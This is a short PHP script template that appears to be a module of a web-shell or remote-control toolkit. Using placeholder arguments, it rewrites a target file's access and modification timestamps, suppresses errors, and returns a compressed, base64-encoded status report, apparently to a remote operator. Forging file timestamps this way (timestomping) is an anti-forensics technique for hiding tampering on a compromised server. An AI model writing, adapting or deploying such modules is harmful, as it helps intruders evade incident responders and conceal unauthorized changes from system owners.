<?php

$start = microtime(true);

$arguments = [
    'level' => '"^level^"',
    'path' => '"^path^"',
    'atime' => '"^atime^"',
    'mtime' => '"^mtime^"'
];

$debug = [];
$data = [];


function chtstmp()
{
    global $arguments, $start, $debug, $data;
    extract($arguments, EXTR_SKIP);
    if (file_exists($path))
    {
        if (!touch($path, $mtime, $atime))
        {
            @array_push($debug, ['error' => 'Unable to modify atime and mtime of `'.$path.'`']);
        }
    }
    else
    {
        @array_push($debug, ['error' => 'Unable to locate `'.$path.'`']);
    }

    $response = json_encode(array(
        'status' => (empty($debug)) ? true : false,
        'time' => microtime(true)-$start,
        'debug' => $debug,
        'operation' => [
            'action' => 'ln',
            'arguments' => $arguments
        ],
        'data' => $data
    ), JSON_UNESCAPED_UNICODE);

    echo str_replace('=', '', base64_encode(gzdeflate($response, $level)));
    // echo $response;
}

@chtstmp();

?>